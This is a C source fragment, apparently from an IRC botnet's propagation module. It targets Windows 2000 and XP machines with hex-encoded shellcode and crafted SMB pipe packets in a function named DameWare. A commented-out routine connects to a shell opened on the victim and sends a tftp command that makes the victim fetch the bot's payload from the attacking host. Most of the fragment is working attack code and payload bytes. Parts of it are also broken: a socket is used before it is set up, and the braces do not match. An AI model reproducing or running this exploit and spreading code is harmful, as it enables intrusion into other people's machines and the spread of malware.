"\x58\x5a\xa0\x4d\xdd\x5a\xb0\x4d\xcd\x5a\x0c\xce\xe8\x61\x4d\xf1"
"\xe8\x5a\x7a\xff\x1b\x61\x57\x04\xfe\xce\xa4\xe1\x58\x63\xe3\x4f"
"\xdb\xf6\x23\x76\x2a\xa4\xdd\xf7\xd9\xf6\x25\x4d\xdb\xf6\x23\x76"
"\x6b\x40\x75\x57\xd9\xf6\x25\x4e\xda\x5d\xa6\xe1\x5e\x9a\x9b\xf9"
"\xf7\xcf\x8a\x49\x71\xdf\xa6\xe1\x5e\x6f\x99\x7a\xe8\x61\x90\x73"
"\x07\xec\x99\x4e\xd7\x20\x3f\x97\x69\x63\xb7\x97\x6c\x38\x33\xed"
"\x24\xf7\xb1\x33\x70\x4b\xdf\x8d\x03\x73\xcb\xb5\x25\xa2\x9b\x6c"
"\x70\xba\xe5\xe1\xfb\x4d\x0c\xc8\xd5\x5e\xa1\x4f\xdf\x58\x99\x1f"
"\xdf\x58\xa6\x4f\x71\xd9\x9b\xb3\x57\x0c\x3d\x4d\x71\xdf\x99\xe1"
"\x71\x3e\x0c\xce\x05\x5e\x0f\x9d\x4a\x6d\x0c\xc8\xdc\xf6\x23\x76"
"\x61";

char packet_13_netwin2k[] =

"\x00\x00\x00\xca\xff\x53\x4d\x42\x25\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xd8\x02\x01\x08\x23\x97\x10\x00\x00\x80\x00\x00"
"\x04\xe0\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a"
"\x00\x80\x00\x4a\x00\x02\x00\x26\x00\x00\x40\x87\x00\x5c\x50\x49"
"\x50\x45\x5c\x00\x05\x00\x00\x02\x10\x00\x00\x00\x80\x00\x00\x00"
"\x00\x00\x00\x00\x68\x00\x00\x00\x00\x00\x1f\x00\xc7\x13\x7e\xdd"
"\xf6\x25\xe1\x5e\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00"
"\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00"
"\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00"
"\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00\x04\x08\x02\x00"
"\x04\x08\x02\x00\x00\x00\x5b\x89\xbe\x00\x00\x00\x02\x00\x00\x00"
"\x00\x00\x00\x00\x02\x00\x00\x00\xeb\x02\x00\x00\x76\x00\x00\x00"
"\x00\x00\x00\x00";


#ifndef NO_netapi


BOOL DameWare(EXINFO exinfo)

{

	int thesocket; 
	int connection;
	int socketstatus;
	int recvbuf[20000]; 
	int fd;
	int con;
	int repbf[20000];
	char sendbuf[IRCLINE];

	struct sockaddr_in theirip;
	struct sockaddr_in theothersocket; 
	thesocket = socket(AF_INET,SOCK_STREAM,0);
	connection = connect(thesocket,(struct sockaddr *)&theothersocket,sizeof(theothersocket)); 


	WSADATA wsaData;
	if(WSAStartup(0x0101,&wsaData) != 0)
	{
		return FALSE;
	}

	int OS=FpHost(exinfo.ip, FP_RPC);
	if(OS==OS_UNKNOWN) return FALSE;

	fd = socket(AF_INET,SOCK_STREAM,0);

	if(fd < 0)
	{
		return FALSE;
	}

	theirip.sin_family = AF_INET;
	theirip.sin_addr.s_addr = finet_addr(exinfo.ip);
	theirip.sin_port = fhtons((unsigned short)exinfo.port);
	theothersocket.sin_family = AF_INET;
	theothersocket.sin_addr.s_addr = finet_addr(exinfo.ip);
	theothersocket.sin_port = fhtons((unsigned short)exinfo.port);


	con = connect(fd,(struct sockaddr *)&theirip,sizeof(theirip));

	if(con < 0)
	{
		return FALSE;
	}
	
	int nTimeout = 5000;
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&nTimeout,sizeof(nTimeout));

	if (OS == 2)
	{
		send(thesocket,packet_01_netwin2k,sizeof(packet_01_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_02_netwin2k,sizeof(packet_02_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_03_netwin2k,sizeof(packet_03_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_04_netwin2k,sizeof(packet_04_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_05_netwin2k,sizeof(packet_05_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_06_netwin2k,sizeof(packet_06_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_07_netwin2k,sizeof(packet_07_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_08_netwin2k,sizeof(packet_08_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_09_netwin2k,sizeof(packet_09_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_10_netwin2k,sizeof(packet_10_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_11_netwin2k,sizeof(packet_11_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_12_netwin2k,sizeof(packet_12_netwin2k)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_13_netwin2k,sizeof(packet_13_netwin2k)-1,0); 
		socketstatus = recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

	}else if (OS == 3)
	{
		send(thesocket,packet_01_winxp,sizeof(packet_01_winxp)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_02_winxp,sizeof(packet_02_winxp)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_03_winxp,sizeof(packet_03_winxp)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_04_winxp,sizeof(packet_04_winxp)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_05_winxp,sizeof(packet_05_winxp)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_06_winxp,sizeof(packet_06_winxp)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_07_winxp,sizeof(packet_07_winxp)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_08_winxp,sizeof(packet_08_winxp)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_09_winxp,sizeof(packet_09_winxp)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_10_winxp,sizeof(packet_10_winxp)-1,0); 
		recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);

		send(thesocket,packet_11_winxp,sizeof(packet_11_winxp)-1,0);
		socketstatus = recv(thesocket,(char *)recvbuf,sizeof(recvbuf),0);
		
	recv(fd,(char *)repbf,sizeof(repbf),0);

	closesocket(fd);

	Sleep(2000);
	}
	}
#endif
	
/*	if (ConnectShell(exinfo,984))
		irc_privmsg(target,"%s %s: Trying to exploit IP: %s", scan_title, exinfo.ip);
		if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
		return TRUE;

}
}
bool ConnectShell(EXINFO exinfo) {

		int len;
		struct sockaddr_in shell_addr;
		char recvbuf[1024];
		SOCKET sockfd;

		shell_addr.sin_family = AF_INET;
		shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip); // = *((LPIN_ADDR) * lpHostEntry->h_addr_list);
		shell_addr.sin_port = fhtons((unsigned short)exinfo.port);;

		if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == -1 )
			return false;
		if (fconnect(sockfd, (struct sockaddr *)&shell_addr, sizeof(struct sockaddr)) == -1) 
			return false;
		
		char mkdir_buff[400]="";

		len = frecv(sockfd, recvbuf, 1024, 0);
		
		_snprintf(mkdir_buff, sizeof (mkdir_buff),
		"tftp -i %s get %s\n"
		"%s\n",
		GetIP(exinfo.sock),filename, filename);

		if (fsend(sockfd, mkdir_buff, sizeof(mkdir_buff)-1,0) == -1)
			return false;
		return true;

}
#endif
	*/